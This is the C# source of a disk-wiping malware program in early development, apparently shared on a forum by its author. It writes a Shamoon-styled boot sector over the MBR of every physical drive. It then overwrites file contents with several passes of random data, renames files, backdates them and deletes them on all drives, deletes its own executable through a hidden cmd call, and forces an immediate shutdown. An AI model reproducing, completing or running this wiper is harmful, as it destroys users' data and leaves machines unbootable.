/*
hello! this is the early development stage that this wiper is currently at.
at the current time this is the first major section finished. MBR hijacking still has to be implemented and will take some time to work out.
i am a single person doing this in my free-time. so please dont try to piss me off about the code being trash.

please run in debug mode. i have not setup the release version yet.

if u want to see what is being added or worked on. please check the TODO section of the thread.
*/
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace Main
{

    class Endurance
    {
        [DllImport("kernel32")] //create files for x64 and x32 bit architectures.
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")] //write files for x64 and x32 bit architectures.
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;

        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;


        enum WipeType
        {
            Content,
            File
        }
        enum WipePass
        {
            Dode,
            Dod,
            Gutmann
        }
        public static void Start()
        {
            try //Checks if Python is installed - Required for wiper to function properly. Will change later.
            {
                if (Directory.Exists(@"C:\Python3")) 
                {
                    Environment.Exit(0);
                }
                else if (Directory.Exists(@"C:\Python3"))
                {
                    Environment.Exit(0);
                }

                    WipePass WipePass = WipePass.Dod;


                List<string> Drives;
                Drives = GetDrives();

                if (!(Drives == null) || !(Drives.Count == 0))
                {
                    // Beginning stage: wiper MBR. MBR hijacking hasn't been implemented just yet on TO-DO. Will fix later.

                    for (int i = 0; i < Drives.Count; i++)
                    {
                        try
                        {
                            // Read mbrdata resources by 32bit signed ints
                            byte[] mbrData = new byte[] {
                            0xE9, 0x00, 0x00, 0xE8, 0x21, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x36,
                            0x7C, 0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x07,
                            0xE8, 0x07, 0x00, 0x46, 0xE9, 0xF3, 0xFF, 0xE9, 0xFD, 0xFF, 0xB4, 0x0E,
                            0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x4F, 0xB9, 0x00, 0x00,
                            0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x46, 0x72, 0x6F, 0x6D, 0x20, 0x49,
                            0x72, 0x61, 0x6E, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x6C, 0x6F, 0x76,
                            0x65, 0x2E, 0x20, 0x2D, 0x20, 0x53, 0x68, 0x61, 0x6D, 0x6F, 0x6F, 0x6E,
                            0x20, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
                            };

                            if (!(mbrData.Length == 512)) //if mbrdata int signage not equal to given total return.
                                return;

                            var mbr = CreateFile(
                                "\\\\.\\PhysicalDrive" + i,
                                GenericAll,
                                FileShareRead | FileShareWrite,
                                IntPtr.Zero,
                                OpenExisting,
                                0,
                                IntPtr.Zero);

                            if (mbr == (IntPtr)(-0x1))
                            {
                                // if error found.
                                break;
                            }

                            if (WriteFile(
                                mbr,
                                mbrData,
                                MbrSize,
                                out uint lpNumberOfBytesWritten,
                                IntPtr.Zero))
                            {
                                // on-to stage 2 check.
                            }
                            else
                            {
                                break;
                            }

                        }
                        catch (Exception)
                        {

                        }
                    }

                    // Beginning stage: wipe files on drive. i++ = all drives found on local machine.
                    for (int i = 0; i < Drives.Count; i++)
                    {
                        Search(Drives[i], WipeType.Content, WipePass); //sDrives

                    }


                    // Late stage: remove files.
                    for (int i = 0; i < Drives.Count; i++)
                    {
                        Search(Drives[i], WipeType.File, WipePass);
                    }
                }

                // Late stage: self-deletion.
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });

                // end stage: shutdown / reboot / restart >> forces shutdown for wiper to show effect.
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/c shutdown /S /T 0 /F",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "powershell.exe" //powershell has more functionality and flexability
                });

            }
            catch (Exception)
            {

            }
        }
        static void Search(string sPath, WipeType WipeType, WipePass WipePass)
        {
            try
            {

                List<string> Files;
                Files = GetFiles(sPath);

                List<string> Directores;
                Directores = GetDirectores(sPath);

                if (!(Files == null) && !(Files.Count == 0))
                {
                    foreach (string sFile in Files)
                    {
                        FileInfo FileInfo = new FileInfo(sFile);

                        if (!(FileInfo.Attributes == FileAttributes.Normal))
                        {
                            try
                            {
                                if (WipeType == WipeType.Content)
                                    File.SetAttributes(sPath, FileAttributes.Normal);

                                bool Status;
                                Status = Delete(sFile, WipeType, WipePass);
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }

                }

                if (!(Directores == null) && !(Directores.Count == 0))
                {
                    foreach (string sDirectory in Directores)
                    {
                        string[] Sensitive = new string[] {
                            "windows", "system volume information"
                        };

                        DirectoryInfo DirectoryInfo = new DirectoryInfo(sDirectory);

                        try
                        {
                            if (Array.IndexOf(Sensitive, DirectoryInfo.Name.ToLower()) == -1)
                            {
                                Search(sDirectory, WipeType, WipePass);
                            }
                            else
                            {
                                continue;
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }

            }
            catch (Exception)
            {

            }
        }
        static bool Delete(string sPath, WipeType WipeType, WipePass WipePass)
        {
            try
            {
                Random Random = new Random();

                if (WipeType == WipeType.Content)
                {
                    double sectors = Math.Ceiling(new FileInfo(sPath).Length / 512.0);


                    byte[] dummyBuffer = new byte[512];


                    RNGCryptoServiceProvider RNGCryptoServiceProvider = new RNGCryptoServiceProvider();

                    Int32 Pass = 0;
                    switch (WipePass)
                    {
                        case WipePass.Dode:
                            Pass = 3;
                            break;
                        case WipePass.Dod:
                            Pass = 7;
                            break;
                        case WipePass.Gutmann:
                            Pass = 35;
                            break;
                        default:
                            break;
                    }

                    FileStream FileStream = new FileStream(sPath, FileMode.Open);
                    for (int currentPass = 0; currentPass < Pass; currentPass++)
                    {


                        FileStream.Position = 0;

                        for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                        {

                            RNGCryptoServiceProvider.GetBytes(dummyBuffer);

                            FileStream.Write(dummyBuffer, 0, dummyBuffer.Length);
                        }
                    }

                    FileStream.Close();

                    // final check
                    return true;
                }
                else if (WipeType == WipeType.File)
                {
                    FileStream FileStream = new FileStream(sPath, FileMode.Open);
                    FileStream.SetLength(0);
                    FileStream.Close();

                    string RandomFileName;
                    RandomFileName = Path.GetRandomFileName();

                    DateTime Start;
                    Start = new DateTime(1995, 1, 1);
                    Int32 Range;
                    Range = (DateTime.Today - Start).Days;
                    DateTime RandomDateTime;
                    RandomDateTime = Start.AddDays(Random.Next(Range));

                    File.SetCreationTime(sPath, RandomDateTime);
                    File.SetLastAccessTime(sPath, RandomDateTime);
                    File.SetLastWriteTime(sPath, RandomDateTime);
                    File.Move(sPath, RandomFileName);
                    File.Delete(RandomFileName);

                    // last check
                    return true;
                }
            }
            catch (Exception)
            {

            }
            // error exception check >> error found
            return false;
        }
        static List<string> GetDirectores(string sPath)
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sDirectory in Directory.GetDirectories(sPath))
                {
                    DirectoryInfo DirectoryInfo = new DirectoryInfo(sDirectory);
                    Temp.Add(sDirectory);
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
        static List<string> GetFiles(string sPath)
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sFile in Directory.GetFiles(sPath))
                {
                    FileInfo FileInfo = new FileInfo(sFile);

                    if (!(FileInfo.Attributes == FileAttributes.System))
                    {
                        Temp.Add(sFile);
                    }
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
        static List<string> GetDrives()
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sDrive in Environment.GetLogicalDrives())
                {
                    DriveInfo DriveInfo = new DriveInfo(sDrive);

                    if (DriveInfo.IsReady && !(DriveInfo.DriveType == DriveType.CDRom))
                        Temp.Add(sDrive);
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
    }

}